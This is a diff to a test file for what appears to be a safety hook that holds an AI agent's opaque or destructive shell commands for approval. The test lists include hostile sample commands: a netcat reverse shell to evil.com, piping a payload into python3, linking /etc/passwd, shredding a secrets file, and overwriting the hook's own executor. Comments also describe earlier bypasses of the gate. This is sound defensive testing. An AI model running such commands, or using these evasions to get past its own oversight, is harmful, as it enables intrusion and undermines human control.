@@ -42,17 +42,65 @@ OPAQUE = [
     "deno eval 'Deno.exit()'",
     "powershell -Command \"rm x\"",
     "pwsh -EncodedCommand ZQ==",
+    # (v1) script-file / module / runner execution: effect undecidable from the
+    # surface (Rice) even though the referent is hashable.
+    "python script.py",
+    "python build.py reports/out.md",
+    "python -m pytest test_x.py -q",
+    "node app.js",
+    "bash deploy.sh",
+    "sh scripts/setup",
+    "npm run build",
+    "npm install",
+    "pip install -r requirements.txt",
+    "npx playwright test",
+    "make",
+    "jupyter nbconvert --to html notebooks/a.ipynb",
+    "git commit -m 'python -c'",
+    "git push origin main",
+    "docker build -t app .",
+    "kubectl apply -f k8s/deploy.yaml",
+    "./scripts/build.sh",
+    # (v2) fail-closed default closes the name-evasion bypass class:
+    "python3.11 -c 'import os; os.remove(\"x\")'",   # versioned interpreter
+    "python3.12 deploy.py",
+    "perl5.36 -e 'unlink \"x\"'",
+    "awk 'BEGIN{system(\"id\")}'",                    # another interpreter
+    "./payload",                                       # local binary, no ext
+    "source deploy.sh",
+    ". ./deploy.sh",
+    "cat deploy.sh | bash",                            # pipe into a shell
+    "cat pub_rt_payload.py | python3",                 # pipe code into interpreter stdin
+    "python3",                                         # bare interpreter: REPL / stdin
+    "node",                                            # bare interpreter: REPL / stdin
+    "nc -e /bin/sh evil.com 4444",                     # unknown verb / net tool
+    ": > important.txt",                               # no-op truncate evasion
+    # (B1) destructive / privilege verbs with NO effect model in any layer --
+    # removed from the modellable allowlist, so they now fail-closed to opaque.
+    "shred -u secrets.txt",                            # rm-equivalent, was unmodeled
+    "install -m 755 payload /usr/local/bin/x",         # write, was unmodeled
+    "ln -sf /etc/passwd link",                         # external link, was unmodeled
+    "chgrp staff notes.txt",                           # privilege, was unmodeled
 ]
 
 NOT_OPAQUE = [
     "ls -la",
     "grep -c foo file.txt",         # -c is grep's flag, grep is not an interpreter
     "cat report.py",
-    "python script.py",            # runs a file (a referent), no inline code
+    # NOTE (v1): `python script.py` MOVED to OPAQUE. A disk referent is hashable
+    # but its effect is still undecidable from the surface (Rice) -- this module's
+    # whole axis. The old "referent => modellable" line contradicted that.
     "cp a b",
     "rm -rf build",                 # destructive but MODELLABLE -- not our axis
-    "git commit -m 'python -c'",   # the string appears as data, not an invocation
+    # NOTE (v2): mutating git commands MOVED to OPAQUE because hooks and repo
+    # metadata effects are not decidable from the command surface. The message
+    # string remains data; the commit command itself is the opaque surface.
     "echo python -c hello",        # echo is not an interpreter
+    "python --version",            # info flag only: no script, no -m -> modellable
+    "node --version",
+    "pip list",                     # query subcommand, not a code-runner subcommand
+    "npm outdated",                 # query subcommand
+    "npm ls",
     "",
     "   ",
 ]
@@ -104,6 +152,23 @@ def test_opaque_python_c_is_held():
 def test_eval_is_held():
     pre = _admit("Bash", {"command": "eval \"$PAYLOAD\""})
     assert pre.blocked, "eval builtin must be held"
+
+
+def test_b1_unmodeled_mutators_are_held():
+    # install/shred/ln/chgrp have NO effect model in any layer; before the B1 cut
+    # they were judged READ -> silent allow AND (carrying no WRITE/DELETE/PRIVILEGE)
+    # slipped the A2 self-protection wall. Removed from the modellable allowlist,
+    # they now fail-closed to opaque -> HOLD.
+    for cmd in (
+        "shred -u notes.txt",
+        "install -m 755 evil opaque_executor.py",   # also the A2-coupling case
+        "ln -sf evil opaque_executor.py",
+        "chgrp staff opaque_executor.py",
+    ):
+        pre = _admit("Bash", {"command": cmd})
+        assert pre.blocked, f"B1 verb must be held, leaked: {cmd!r} ({pre.reason_code})"
+        decision = pre.output.get("hookSpecificOutput", {}).get("permissionDecision")
+        assert decision in {"ask", "deny"}, f"{cmd!r}: expected hold/deny, got {decision!r}"
 
 
 # --------------------------------------------------------------------------- #
